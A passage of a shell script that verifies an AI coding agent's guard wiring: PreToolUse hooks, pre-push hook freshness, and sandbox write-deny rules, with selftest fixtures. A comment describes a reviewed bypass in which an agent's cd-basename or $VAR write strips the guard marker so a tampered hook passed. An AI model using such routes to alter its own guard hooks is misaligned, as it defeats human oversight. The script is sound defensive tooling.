          _gw_hook="$_gw_hookdir_r/$(basename -- "$_gw_hook")"
        fi
      fi
      if [ "$_gw_hook_unresolvable" -eq 1 ]; then
        : # already reported above
      elif [ -z "$_gw_hook" ]; then
        echo "N/A: pre-push rung — could not resolve the installed hook path via 'git rev-parse --git-path hooks/pre-push'"
      else
        _gw_hp=$(_gw_git -C "$dir" config --get core.hooksPath 2>/dev/null) || _gw_hp=""
        if _gw_is_linked "$dir"; then _gw_linked=1; else _gw_linked=0; fi
        _gw_redirect_done=0
        _gw_redirect_note=""
        # Δ1: which INSTALL MODE this tree runs. `installed` = the copy at the default hooks dir (the
        # original, unchanged ladder). `tracked` = core.hooksPath names the tree's own tracked hooks/,
        # so hooks/pre-push IS the live hook. The ladder below is SHARED — `git rev-parse --git-path
        # hooks/pre-push` already respects the setting (measured), so it walks the right file either
        # way and its byte compare against HEAD:hooks/pre-push is the freshness BOTH modes need. Only
        # the wording, the remedies and the two linked-worktree branches are mode-aware.
        _gw_mode=installed
        if [ -n "$_gw_hp" ] && ! _gw_hookspath_noop "$_gw_hp" "$dir"; then
          # core.hooksPath looks like a genuine redirect elsewhere — a husky/lefthook adopter may
          # own that dir; the kit neither installs into it nor passes judgment on what's there (D2).
          if _gw_hostile "$_gw_hp"; then
            # SEC M1 + REV L1 (item 4c): the hooksPath branch is checked BEFORE the resolved-hook
            # hostile FAIL below, so a control-char REDIRECT value takes this never-judge N/A rather
            # than a judgment further down.
            echo "N/A: pre-push rung — core.hooksPath contains a CONTROL CHARACTER; refusing to print it"
            _gw_redirect_done=1
          elif _gw_hookspath_tracked "$_gw_hp" "$dir"; then
            # Δ1 — TRACKED-HOOKS MODE, checked BEFORE both branches below on purpose: for the tree's
            # own hooks/ dir the REV H1 premise ("a RELATIVE value in a linked worktree resolves to
            # nothing here") is FALSE — a linked checkout has its own hooks/ — and the D2
            # foreign-redirect skip is false too. Fall through to the ladder with no note.
            _gw_mode=tracked
          else
            case "$_gw_hp" in /*) _gw_hp_relative=0 ;; *) _gw_hp_relative=1 ;; esac
            if [ "$_gw_linked" -eq 1 ] && [ "$_gw_hp_relative" -eq 1 ]; then
              # REV H1 (review round 1, item 2): a linked worktree + RELATIVE hooksPath is not a
              # genuine foreign redirect the kit can disclose-skip — git resolves it against THIS
              # worktree, which has no hooks dir of its own, so hooks are silently disabled. Fall
              # through to the ladder (which already reflects hooksPath via --git-path) instead of
              # the redirect N/A; the ladder's own FAIL below names this redirect as the cause.
              _gw_redirect_note=" (core.hooksPath='$_gw_hp' is RELATIVE in a linked worktree — it resolves to nothing here, disabling hooks)"
            elif _gw_kitsource "$dir"; then
              # Δ2 — the disarm face, KIT-SOURCE trees only. Here the redirect is not a husky adopter
              # owning their hooks dir; it is the kit's own rung pointed away from both the default
              # dir and the tracked hooks/ dir, i.e. disarmed. The remedy names the SCOPE that
              # actually carries the value: a `--unset` in the repo cures nothing when the value is
              # the maintainer's GLOBAL one (and _gw_git deliberately does NOT strip HOME, because
              # git honors that same global config at push time — so this leg sees what a push sees).
              _gw_hp_local=$(_gw_git -C "$dir" config --local --get core.hooksPath 2>/dev/null) || _gw_hp_local=""
              if [ -n "$_gw_hp_local" ]; then
                _gw_disarm_cure="unset it in this repo, or point it at the tracked dir (the kit's own install: core.hooksPath = hooks)"
              else
                _gw_disarm_cure="the value is NOT in this repo's local config — it comes from your GLOBAL/system git config, so a repo-local unset cures nothing; fix it with a --global unset (or override it repo-locally by pointing core.hooksPath at hooks)"
              fi
              printf '%s\n' "FAIL: pre-push rung — kit-source tree with core.hooksPath='$_gw_hp': hooks are redirected away from BOTH the default dir and the tracked hooks/ dir, so the push rung is DISARMED on the kit's own repo (remedy: $_gw_disarm_cure)"; fail2=1
              _gw_redirect_done=1
            else
              printf '%s\n' "N/A: pre-push rung — core.hooksPath redirects hooks to '$_gw_hp'; the kit does not judge another tool's hooks dir (disclosed skip; never green, never red)"
              _gw_redirect_done=1
            fi
          fi
        fi
        if [ "$_gw_redirect_done" -eq 0 ]; then
          if _gw_hostile "$_gw_hook"; then
            echo "FAIL: pre-push rung — the resolved hook path contains a CONTROL CHARACTER; refusing to print it"; fail2=1
          else
            # Δ1: the remedy is mode-aware. In tracked-hooks mode a `cp` remedy is nonsense — there is
            # nothing to copy TO; the live hook is the tracked file itself, so the cure is to restore
            # or commit it.
            if [ "$_gw_mode" = tracked ]; then
              _gw_remedy="tracked-hooks mode: hooks/pre-push in THIS checkout IS the live hook — commit it, or restore it with 'git restore -- hooks/pre-push'; never a cp (see docs/adoption/brownfield.md §2 step 5)"
            else
              _gw_remedy="see docs/adoption/brownfield.md §2 step 5 for the human-run install/refresh command (never re-run incept)"
            fi
            if [ -h "$_gw_hook" ] && [ ! -e "$_gw_hook" ]; then
              printf '%s\n' "FAIL: pre-push rung — $_gw_hook is a DANGLING SYMLINK (remedy: rm it — a cp here would write through the link; $_gw_remedy)"; fail2=1
            elif [ ! -f "$_gw_hook" ]; then
              printf '%s\n' "FAIL: pre-push rung — not installed at $_gw_hook${_gw_redirect_note} ($_gw_remedy)"; fail2=1
            elif [ ! -r "$_gw_hook" ]; then
              printf '%s\n' "FAIL: pre-push rung — $_gw_hook present but UNREADABLE — cannot verify it ($_gw_remedy)"; fail2=1
            elif [ ! -x "$_gw_hook" ]; then
              printf '%s\n' "FAIL: pre-push rung — $_gw_hook present but NOT EXECUTABLE — git silently ignores it on push ($_gw_remedy)"; fail2=1
            elif [ "$_gw_mode" = tracked ]; then
              # ── TRACKED-HOOKS MODE takes its own tail, in COMPARE-FIRST order (review round 1
              # BLOCKER, both seats; security measured the composed exploit end to end). The shared
              # chain below tests the KIT_GUARD_CORE marker BEFORE the byte compare, and in this mode
              # that short-circuit was a false green: deleting the marker line from the live worktree
              # hook — the shape a cd-basename write produces (GUARD-BASENAME-AFTER-CD-BYPASS now denies
              # the single-command quote-free case in real time, but its persisted-cwd/$VAR residuals
              # still produce this shape) — bought a "foreign hook preserved" PASS on a hook whose body
              # is arbitrary code at push time. Here the compare runs first and a divergence from HEAD is judged
              # marker or no marker, while a file that MATCHES HEAD and carries no marker still takes
              # the foreign-preserve PASS (the adopter whose own tracked hook legitimately is not the
              # kit's — asserted as a false-positive lock).
              # The order is deliberately NOT changed for INSTALLED-copy mode below: there the compared
              # file is a COPY that may legitimately be another tool's hook entirely, so marker-first
              # is what keeps a foreign installed hook unjudged (§4.3 brownfield safety, rung_foreign).
              if ! _gw_git -C "$dir" cat-file -e "HEAD:hooks/pre-push" 2>/dev/null; then
                printf '%s\n' "FAIL: pre-push rung — tracked hooks/pre-push missing from HEAD, so the live hook cannot be compared against anything this tree carries ($_gw_remedy)"; fail2=1
              else
                _gw_hm_rc=0
                _gw_head_matches "$dir" "$_gw_hook" || _gw_hm_rc=$?
                if [ "$_gw_hm_rc" -eq 2 ]; then
                  printf '%s\n' "FAIL: pre-push rung — could not materialize tracked hooks/pre-push from HEAD to compare the live hook against ($_gw_remedy)"; fail2=1
                elif [ "$_gw_hm_rc" -eq 1 ]; then
                  printf '%s\n' "FAIL: pre-push rung — $_gw_hook is MODIFIED in the working tree — the LIVE hook does not match tracked HEAD:hooks/pre-push byte-for-byte, so the code git runs on push is not the code this tree carries ($_gw_remedy)"; fail2=1
                elif ! grep -q 'KIT_GUARD_CORE' "$_gw_hook" 2>/dev/null; then
                  echo "PASS: pre-push rung — foreign hook preserved (no KIT_GUARD_CORE marker, and it matches HEAD byte-for-byte); brownfield-safe, not the kit's to judge"
                elif [ ! -r "$dir/.claude/hooks/guard-core.sh" ]; then
                  printf '%s\n' "FAIL: pre-push rung — the live tracked hook matches HEAD but its core target $dir/.claude/hooks/guard-core.sh is missing/unreadable — not core-resolvable (D3; $_gw_remedy)"; fail2=1
                else
                  printf '%s\n' "PASS: pre-push rung — tracked-hooks mode (core.hooksPath='$_gw_hp'): the live hook IS the tracked hooks/pre-push, executable, worktree matches HEAD byte-for-byte, core-resolvable"
                fi
              fi
            elif ! grep -q 'KIT_GUARD_CORE' "$_gw_hook" 2>/dev/null; then
              echo "PASS: pre-push rung — foreign hook preserved (no KIT_GUARD_CORE marker); brownfield-safe, not the kit's to judge"
            elif [ "$_gw_linked" -eq 1 ]; then
              # Δ1 (why this branch is INSTALLED-mode-only): the Δ6 freshness-N/A rationale below holds
              # only where the two compare sides genuinely live in different checkouts — a shared
              # installed hook vs this checkout's own tracked copy. In TRACKED-HOOKS mode both sides
              # live in THIS checkout (its own hooks/pre-push, its own HEAD), so the compare is exact
              # and N/A-ing it would blind the very surface the kit's engineer fan-out builds on. That
              # mode never reaches here: it took its own compare-first tail above.
              echo "PASS: pre-push rung — installed, executable, marked (kit's)"
              echo "N/A: pre-push rung freshness — linked worktree/submodule; --git-path resolves the SHARED installed hook while hooks/pre-push is this checkout's own tracked copy, so a byte compare here would be spurious (Δ6, disclosed)"
            elif ! _gw_git -C "$dir" cat-file -e "HEAD:hooks/pre-push" 2>/dev/null; then
              # REV M1 + SEC L1 (review round 1, item 5): freshness compares against the TRACKED
              # blob at HEAD, never the working-tree file (which can be gutted); an absent tracked
              # blob is its OWN verdict, never the STALE wording.
              # B3: "missing from HEAD" has TWO causes needing OPPOSITE remedies. An unresolvable HEAD
              # means no commits yet — "recopy the kit tree" there tells an adopter to overwrite a correct tree to cure a missing `git commit`.
              if ! _gw_git -C "$dir" rev-parse --verify HEAD >/dev/null 2>&1; then
                printf '%s\n' "FAIL: pre-push rung — this repository has no commits yet, so there is no HEAD to compare hooks/pre-push against — commit the baseline first (git add -A && git commit -m 'chore: incept baseline'). Nothing is missing from your tree, so do not re-install or overwrite it"; fail2=1
              else
                printf '%s\n' "FAIL: pre-push rung — tracked hooks/pre-push missing from HEAD — recopy the kit tree ($_gw_remedy)"; fail2=1
              fi
            else
              _gw_tracked=$(mktemp 2>/dev/null) || _gw_tracked=""
              if [ -z "$_gw_tracked" ]; then
                echo "FAIL: pre-push rung — could not create a scratch file to materialize the tracked hook for comparison"; fail2=1
              elif ! _gw_git -C "$dir" show "HEAD:hooks/pre-push" > "$_gw_tracked" 2>/dev/null; then
                printf '%s\n' "FAIL: pre-push rung — could not materialize tracked hooks/pre-push from HEAD ($_gw_remedy)"; fail2=1
                rm -f "$_gw_tracked"
              elif ! cmp -s "$_gw_tracked" "$_gw_hook" 2>/dev/null; then
                # INSTALLED-copy mode only (tracked mode took its own tail above): an out-of-date COPY.
                printf '%s\n' "FAIL: pre-push rung — $_gw_hook carries the kit marker but is STALE — it does not match tracked HEAD:hooks/pre-push byte-for-byte ($_gw_remedy)"; fail2=1
                rm -f "$_gw_tracked"
              else
                rm -f "$_gw_tracked"
                _gw_core="$dir/.claude/hooks/guard-core.sh"
                if [ ! -r "$_gw_core" ]; then
                  printf '%s\n' "FAIL: pre-push rung — installed hook is FRESH but its core target $_gw_core is missing/unreadable — not core-resolvable (D3; $_gw_remedy)"; fail2=1
                else
                  echo "PASS: pre-push rung — installed, executable, FRESH (matches tracked HEAD:hooks/pre-push byte-for-byte), core-resolvable"
                fi
              fi
            fi
          fi
        fi
      fi
    fi
  fi

  if [ "$fail" -ne 0 ]; then
    echo "guard-wired: FAIL — the runtime guard is NOT active; agents would run unprotected (see docs/adoption/brownfield.md)" >&2
    return 1
  fi
  if [ "$fail2" -ne 0 ]; then
    # REV M2 (review round 1, item 6): only the second rung failed — the PreToolUse guard above IS
    # wired, so do not claim runtime protection is absent; name the failed rung instead.
    echo "guard-wired: FAIL — a guard rung is not wired (see FAIL line(s) above)" >&2
    return 1
  fi
  if [ "$unverified" -ne 0 ]; then
    echo "guard-wired: UNVERIFIED — presence OK but the matcher was not structurally confirmed (install jq)" >&2
    return 2
  fi
  if [ "$mode" = "rung1only" ]; then
    echo "guard-wired: OK (--rung1-only: PreToolUse guard hook registered, matcher admits mutating tools, hook present; the second rung was NOT evaluated in this mode)"
  else
    echo "guard-wired: OK (PreToolUse guard hook registered, matcher admits mutating tools, hook present; the push-rung leg above certifies the SECOND rung in EITHER install mode — an installed copy or tracked-hooks mode (core.hooksPath -> the tree's own hooks/) — present/executable/core-resolvable/FRESH, or a preserved foreign hook (uncertified), or a disclosed N/A — no longer blind to it)"
  fi
  return 0
}

# mktemp fixtures; outcomes asserted. Fixtures LEFT in place (no rm -rf; 7e guard).
selftest() {
  st=0
  base=$(mktemp -d)

  # The strict profile's `sandbox` block as a fixture (the template's shape, in its STRICT form: no
  # network.allowUnixSockets, which the leg must accept since allowUnixSockets is optional).
  _gw_full_sbx='{"enabled":true,"autoAllowBashIfSandboxed":false,"allowUnsandboxedCommands":false,"filesystem":{"allowWrite":["~","/tmp","/private/var/folders","/var/folders"],"denyWrite":["./.claude","./hooks","./.kit","./.git/hooks","./.git/config","./.mcp.json","~/.gitconfig","~/.config/git","~/.zshrc","~/.zshenv","~/.zprofile","~/.bashrc","~/.bash_profile","~/.profile"]}}'

  # mk <dir> <matcher>: a project whose PreToolUse guard.sh hook uses <matcher> + a valid guard.sh. The sandbox is
  # No `sandbox` key at all, as shipped (an explicit false would outrank a developer's own user-level setting):
  # the default profile (SANDBOX-OFF-BY-DEFAULT-STRICT-OPT-IN).
  mk() {
    _d="$1"; _m="$2"; mkdir -p "$_d/.claude/hooks"
    printf '{"permissions":{"deny":["Edit(/.claude/**)","Edit(/hooks/**)","Edit(/.kit/**)"]},"hooks":{"PreToolUse":[{"matcher":"%s","hooks":[{"type":"command","command":"sh .claude/hooks/guard.sh"}]}]}}\n' "$_m" > "$_d/.claude/settings.json"
    printf '#!/bin/sh\nexit 0\n' > "$_d/.claude/hooks/guard.sh"
  }

  # mk_sbx <dir> <jq-filter>: the fixture with the STRICT block in settings.json, then <jq-filter> applied to the
  # document (a mutant).
  mk_sbx() {
    mk "$1" 'Bash|Write|Edit|NotebookEdit|mcp__.*'
    jq --argjson s "$_gw_full_sbx" ".sandbox = \$s | $2" "$1/.claude/settings.json" > "$1/.claude/settings.json.new" && mv "$1/.claude/settings.json.new" "$1/.claude/settings.json"
  }

  # mk_loc <dir> <jq-filter>: an adopter's .claude/settings.local.json holding the strict block, then <jq-filter>
  # applied to the document (a copy of the template, or a mutant of it).
  mk_loc() {
    jq -n --argjson s "$_gw_full_sbx" '{sandbox: $s}' | jq "$2" > "$1/.claude/settings.local.json"
  }

  # mk_tmpl <dir> <jq-filter>: the kit's templates/sandbox-strict.settings.local.json (or a mutant of it).
  mk_tmpl() {
    mkdir -p "$1/templates"
    jq -n --argjson s "$_gw_full_sbx" '{sandbox: $s}' | jq "$2" > "$1/templates/sandbox-strict.settings.local.json"
  }

  # Static sandbox leg: the shipped default (sandbox OFF) is wired; the strict block, wherever it comes from
  # (settings.json, an adopter's settings.local.json, or the shipped template), has one mutant per required key
  # / entry removed that must FAIL, naming the gap.
  if command -v jq >/dev/null 2>&1; then
    d="$base/sbx_off"; mk_sbx "$d" '.sandbox.enabled = false'
    if out=$(check_dir "$d" 2>&1); then rc=0; else rc=$?; fi
    if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -q 'sandbox is off'; then echo "selftest PASS: sandbox.enabled=false -> wired (the shipped default)"; else echo "selftest FAIL: sandbox.enabled=false should be wired as the off default (rc=$rc)"; st=1; fi
    d="$base/sbx_nosandbox"; mk_sbx "$d" 'del(.sandbox)'
    if out=$(check_dir "$d" 2>&1); then rc=0; else rc=$?; fi
    if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -q 'sandbox is off'; then echo "selftest PASS: no sandbox block -> wired (off)"; else echo "selftest FAIL: no sandbox block should be wired as off (rc=$rc)"; st=1; fi
    # The Edit denies and the hook stay required in the OFF default (the layer left when the OS sandbox is off).
    for _r in 'Edit(/.claude/**)' 'Edit(/hooks/**)' 'Edit(/.kit/**)'; do
      d="$base/off_no_$(printf '%s' "$_r" | tr -c 'A-Za-z0-9\n' '_')"; mk "$d" 'Bash|Write|Edit|NotebookEdit|mcp__.*'
      jq --arg r "$_r" 'del(.permissions.deny[] | select(. == $r))' "$d/.claude/settings.json" > "$d/s.new" && mv "$d/s.new" "$d/.claude/settings.json"
      if out=$(check_dir "$d" 2>&1); then rc=0; else rc=$?; fi
      if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -qF "permissions.deny lacks $_r"; then echo "selftest PASS: off default without $_r -> FAIL"; else echo "selftest FAIL: off default without $_r should FAIL (rc=$rc)"; st=1; fi
    done
    # An adopter's settings.local.json turning the sandbox on: the EFFECTIVE block is checked (scalars local over
    # project, filesystem arrays concatenated).
    d="$base/loc_full"; mk "$d" 'Bash|Write|Edit|NotebookEdit|mcp__.*'; mk_loc "$d" '.'
    if out=$(check_dir "$d" 2>&1); then rc=0; else rc=$?; fi
    if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -q 'PASS: the effective sandbox block'; then echo "selftest PASS: an adopter local file holding the full strict block -> wired"; else echo "selftest FAIL: an adopter local file holding the full strict block should be wired (rc=$rc)"; st=1; fi
    d="$base/loc_short"; mk "$d" 'Bash|Write|Edit|NotebookEdit|mcp__.*'; mk_loc "$d" 'del(.sandbox.filesystem.denyWrite[] | select(. == "./.claude"))'
    if out=$(check_dir "$d" 2>&1); then rc=0; else rc=$?; fi
    if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -qF 'denyWrite lacks ./.claude'; then echo "selftest PASS: an adopter local file with a short denyWrite -> FAIL"; else echo "selftest FAIL: an adopter local file with a short denyWrite should FAIL (rc=$rc)"; st=1; fi
    d="$base/loc_enabled_only"; mk "$d" 'Bash|Write|Edit|NotebookEdit|mcp__.*'; printf '{"sandbox":{"enabled":true}}\n' > "$d/.claude/settings.local.json"
    if out=$(check_dir "$d" 2>&1); then rc=0; else rc=$?; fi
    if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -qF 'denyWrite lacks'; then echo "selftest PASS: an adopter local file that only sets enabled -> FAIL"; else echo "selftest FAIL: an adopter local file that only sets enabled should FAIL (rc=$rc)"; st=1; fi
    d="$base/loc_unsandboxed"; mk "$d" 'Bash|Write|Edit|NotebookEdit|mcp__.*'; mk_loc "$d" '.sandbox.allowUnsandboxedCommands = true'
    if out=$(check_dir "$d" 2>&1); then rc=0; else rc=$?; fi
    if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -qF 'allowUnsandboxedCommands'; then echo "selftest PASS: an adopter local file with allowUnsandboxedCommands true -> FAIL"; else echo "selftest FAIL: an adopter local file with allowUnsandboxedCommands true should FAIL (rc=$rc)"; st=1; fi
    d="$base/loc_badjson"; mk "$d" 'Bash|Write|Edit|NotebookEdit|mcp__.*'; printf '{ not json\n' > "$d/.claude/settings.local.json"
    if out=$(check_dir "$d" 2>&1); then rc=0; else rc=$?; fi
    if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -qF 'not valid JSON'; then echo "selftest PASS: an adopter local file that is not JSON -> FAIL"; else echo "selftest FAIL: an adopter local file that is not JSON should FAIL (rc=$rc)"; st=1; fi
    # The documented merge: arrays CONCATENATE across the two files (half the entries in each is the full set), and
    # a local enabled:false turns a strict project file off (scalars: local over project).
    d="$base/loc_split"; mk_sbx "$d" '.sandbox.filesystem.denyWrite = .sandbox.filesystem.denyWrite[0:5]'; mk_loc "$d" '.sandbox.filesystem.denyWrite = .sandbox.filesystem.denyWrite[5:]'
    if out=$(check_dir "$d" 2>&1); then rc=0; else rc=$?; fi
    if [ "$rc" -eq 0 ]; then echo "selftest PASS: denyWrite split across settings.json and the local file -> wired (arrays concatenate)"; else echo "selftest FAIL: a denyWrite split across the two files should be wired (rc=$rc)"; st=1; fi
    d="$base/loc_turns_off"; mk_sbx "$d" '.'; printf '{"sandbox":{"enabled":false}}\n' > "$d/.claude/settings.local.json"
    if out=$(check_dir "$d" 2>&1); then rc=0; else rc=$?; fi
    if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -q 'sandbox is off'; then echo "selftest PASS: a local enabled:false over a strict project file -> off, wired"; else echo "selftest FAIL: a local enabled:false should override the project (rc=$rc)"; st=1; fi
    # The shipped strict template: exists and parses and carries every load-bearing key in the kit's own tree.
    d="$base/tmpl_good"; mkdir -p "$d"; mk_tmpl "$d" '.'
    if _gw_template_check "$d" >/dev/null 2>&1; then echo "selftest PASS: a complete strict template -> wired"; else echo "selftest FAIL: a complete strict template should be wired"; st=1; fi
    _tm_mut() {  # <dir-name> <jq-filter> <expected-substring>
      d="$base/tmpl_$1"; mkdir -p "$d"; mk_tmpl "$d" "$2"
      if out=$(_gw_template_check "$d" 2>&1); then rc=0; else rc=$?; fi
      if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -qF "$3"; then echo "selftest PASS: strict template $1 -> FAIL"; else echo "selftest FAIL: strict template $1 should FAIL naming '$3' (rc=$rc)"; st=1; fi
    }
    _tm_mut enabled_false '.sandbox.enabled = false' 'sandbox.enabled'
    _tm_mut unsandboxed_true '.sandbox.allowUnsandboxedCommands = true' 'allowUnsandboxedCommands'
    _tm_mut unsandboxed_absent 'del(.sandbox.allowUnsandboxedCommands)' 'allowUnsandboxedCommands'
    _tm_mut autoallow_true '.sandbox.autoAllowBashIfSandboxed = true' 'autoAllowBashIfSandboxed'
    _tm_mut excluded '.sandbox.excludedCommands = ["git"]' 'excludedCommands'
    for _t in /private/var/folders /var/folders; do
      _tm_mut "allow_$(printf '%s' "$_t" | tr -c 'A-Za-z0-9\n' '_')" "del(.sandbox.filesystem.allowWrite[] | select(. == \"$_t\"))" "allowWrite lacks $_t"
    done
    for _e in $SANDBOX_DENY_REQUIRED; do
      _tm_mut "deny_$(printf '%s' "$_e" | tr -c 'A-Za-z0-9\n' '_')" "del(.sandbox.filesystem.denyWrite[] | select(. == \"$_e\"))" "denyWrite lacks $_e"
    done
    d="$base/tmpl_badjson"; mkdir -p "$d/templates"; printf '{ not json\n' > "$d/templates/sandbox-strict.settings.local.json"
    if out=$(_gw_template_check "$d" 2>&1); then rc=0; else rc=$?; fi
    if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -qF 'not valid JSON'; then echo "selftest PASS: a strict template that is not JSON -> FAIL"; else echo "selftest FAIL: a non-JSON strict template should FAIL (rc=$rc)"; st=1; fi
    d="$base/tmpl_nomarker"; mkdir -p "$d"
    if out=$(_gw_template_check "$d" 2>&1); then rc=0; else rc=$?; fi
    if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -q '^N/A'; then echo "selftest PASS: no template and no kit marker -> N/A"; else echo "selftest FAIL: no template and no kit marker should be N/A (rc=$rc)"; st=1; fi
    d="$base/tmpl_marker"; mkdir -p "$d/docs"; : > "$d/docs/ROADMAP-KIT.md"
    if out=$(_gw_template_check "$d" 2>&1); then rc=0; else rc=$?; fi
    if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -qF 'missing from a kit tree'; then echo "selftest PASS: a kit-source tree without the strict template -> FAIL"; else echo "selftest FAIL: a kit-source tree without the strict template should FAIL (rc=$rc)"; st=1; fi
    d="$base/sbx_unsandboxed"; mk_sbx "$d" '.sandbox.allowUnsandboxedCommands = true'
    if out=$(check_dir "$d" 2>&1); then rc=0; else rc=$?; fi
    if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'allowUnsandboxedCommands'; then echo "selftest PASS: allowUnsandboxedCommands=true -> FAIL"; else echo "selftest FAIL: allowUnsandboxedCommands=true should FAIL (rc=$rc)"; st=1; fi
    d="$base/sbx_nounsandboxedkey"; mk_sbx "$d" 'del(.sandbox.allowUnsandboxedCommands)'
    if out=$(check_dir "$d" 2>&1); then rc=0; else rc=$?; fi
    if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'allowUnsandboxedCommands'; then echo "selftest PASS: allowUnsandboxedCommands absent -> FAIL"; else echo "selftest FAIL: allowUnsandboxedCommands absent should FAIL (rc=$rc)"; st=1; fi
    # One mutant per added key/rule: each must FAIL naming the gap.
    _sbx_mut() {  # <dir-name> <jq-filter> <expected-substring>
      d="$base/$1"; mk_sbx "$d" "$2"
      if out=$(check_dir "$d" 2>&1); then rc=0; else rc=$?; fi
      if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -qF "$3"; then echo "selftest PASS: $1 -> FAIL"; else echo "selftest FAIL: $1 should FAIL naming '$3' (rc=$rc)"; st=1; fi
    }
    _sbx_mut sbx_autoallow_removed 'del(.sandbox.autoAllowBashIfSandboxed)' 'autoAllowBashIfSandboxed'
    _sbx_mut sbx_autoallow_true '.sandbox.autoAllowBashIfSandboxed = true' 'autoAllowBashIfSandboxed'
    _sbx_mut sbx_excluded '.sandbox.excludedCommands = ["git"]' 'excludedCommands'
    _sbx_mut sbx_weaker_nested '.sandbox.enableWeakerNestedSandbox = true' 'enableWeakerNestedSandbox'
    _sbx_mut sbx_all_unix_sockets '.sandbox.network.allowAllUnixSockets = true' 'allowAllUnixSockets'
    _sbx_mut sbx_deny_edit_claude 'del(.permissions.deny[] | select(. == "Edit(/.claude/**)"))' 'permissions.deny lacks Edit(/.claude/**)'
    _sbx_mut sbx_deny_edit_hooks 'del(.permissions.deny[] | select(. == "Edit(/hooks/**)"))' 'permissions.deny lacks Edit(/hooks/**)'
    _sbx_mut sbx_deny_edit_kit 'del(.permissions.deny[] | select(. == "Edit(/.kit/**)"))' 'permissions.deny lacks Edit(/.kit/**)'
    for _t in /private/var/folders /var/folders; do
      _sbx_mut "sbx_allow_$(printf '%s' "$_t" | tr -c 'A-Za-z0-9\n' '_')" "del(.sandbox.filesystem.allowWrite[] | select(. == \"$_t\"))" "allowWrite lacks $_t"
    done
    d="$base/sbx_excluded_empty"; mk_sbx "$d" '.sandbox.excludedCommands = []'
    if check_dir "$d" >/dev/null 2>&1; then echo "selftest PASS: an empty excludedCommands -> wired"; else echo "selftest FAIL: an empty excludedCommands should be wired"; st=1; fi
    for _e in $SANDBOX_DENY_REQUIRED; do
      d="$base/sbx_deny_$(printf '%s' "$_e" | tr -c 'A-Za-z0-9\n' '_')"
      mk_sbx "$d" "del(.sandbox.filesystem.denyWrite[] | select(. == \"$_e\"))"
      if out=$(check_dir "$d" 2>&1); then rc=0; else rc=$?; fi
      if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -qF "denyWrite lacks $_e"; then echo "selftest PASS: denyWrite without $_e -> FAIL"; else echo "selftest FAIL: denyWrite without $_e should FAIL (rc=$rc)"; st=1; fi
    done
    d="$base/sbx_superset"; mk_sbx "$d" '.sandbox.filesystem.denyWrite += ["./extra"] | .sandbox.network.allowUnixSockets = ["/var/run/docker.sock"]'
    if check_dir "$d" >/dev/null 2>&1; then echo "selftest PASS: a superset denyWrite and an allowUnixSockets entry -> wired"; else echo "selftest FAIL: a superset denyWrite and allowUnixSockets should be wired"; st=1; fi
    # --sandbox-enforce: no npx -> SKIP (rc 3, never a pass); no enabled sandbox block -> FAIL (rc 1).
    # --sandbox-enforce runs against the STRICT profile: the shipped settings.json (sandbox off) merged with the
    # template under templates/, so every enforce fixture is a default project plus a (possibly mutated) template.
    d="$base/sbx_enf"; mk "$d" 'Bash|Write|Edit|NotebookEdit|mcp__.*'; mk_tmpl "$d" '.'
    mkdir -p "$base/sbx_bin"; ln -sf "$(command -v jq)" "$base/sbx_bin/jq"
    if out=$(PATH="$base/sbx_bin" /bin/sh "$0" --sandbox-enforce "$d" 2>&1); then rc=0; else rc=$?; fi
    if [ "$rc" -eq 3 ] && printf '%s' "$out" | grep -q '^SKIP: npx'; then echo "selftest PASS: --sandbox-enforce without npx -> SKIP rc 3"; else echo "selftest FAIL: --sandbox-enforce without npx should SKIP with rc 3 (rc=$rc)"; st=1; fi
    # _enf_fail <dir> <label>: the run must exit 1; rc 3 (no sandbox runtime here) is a disclosed SKIP, never a pass.
    _enf_fail() {
      if out=$(sh "$0" --sandbox-enforce "$1" 2>&1); then rc=0; else rc=$?; fi
      if [ "$rc" -eq 1 ]; then echo "selftest PASS: --sandbox-enforce $2 -> FAIL"
      elif [ "$rc" -eq 3 ] && ! printf '%s' "$out" | grep -q '^FAIL'; then echo "selftest SKIP: --sandbox-enforce $2 (no sandbox runtime here)"
      else echo "selftest FAIL: --sandbox-enforce $2 must exit 1 (rc=$rc)"; st=1; fi
    }
    # No template, or one that does not turn the sandbox on: there is no strict profile to enforce. Both exit 1
    # before the runtime is started, so these two never SKIP.
    d="$base/sbx_enf_notmpl"; mk "$d" 'Bash|Write|Edit|NotebookEdit|mcp__.*'
    if out=$(sh "$0" --sandbox-enforce "$d" 2>&1); then rc=0; else rc=$?; fi
    if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'strict'; then echo "selftest PASS: --sandbox-enforce with no strict template -> FAIL"; else echo "selftest FAIL: --sandbox-enforce with no strict template should FAIL (rc=$rc)"; st=1; fi
    d="$base/sbx_enf_off"; mk "$d" 'Bash|Write|Edit|NotebookEdit|mcp__.*'; mk_tmpl "$d" '.sandbox.enabled = false'
    if out=$(sh "$0" --sandbox-enforce "$d" 2>&1); then rc=0; else rc=$?; fi
    if [ "$rc" -eq 1 ]; then echo "selftest PASS: --sandbox-enforce on a strict profile that is off -> FAIL"; else echo "selftest FAIL: --sandbox-enforce with the strict profile off should FAIL (rc=$rc)"; st=1; fi
    # A SKIP must never hide a FAIL: with no /tmp in allowWrite and ./.claude missing from the template's denyWrite,
    # the write to .claude/hooks/x LANDS while the sentinel (under /tmp) cannot, so the run must exit 1, never 3.
    d="$base/sbx_enf_landed"; mk "$d" 'Bash|Write|Edit|NotebookEdit|mcp__.*'; mk_tmpl "$d" '.sandbox.filesystem.allowWrite = ["~"] | del(.sandbox.filesystem.denyWrite[] | select(. == "./.claude"))'
    _enf_fail "$d" "with a template missing ./.claude and a landed protected write and no sentinel"
    # A template missing a home entry: the dotfile write lands under the runtime, so leg 1 must go red.
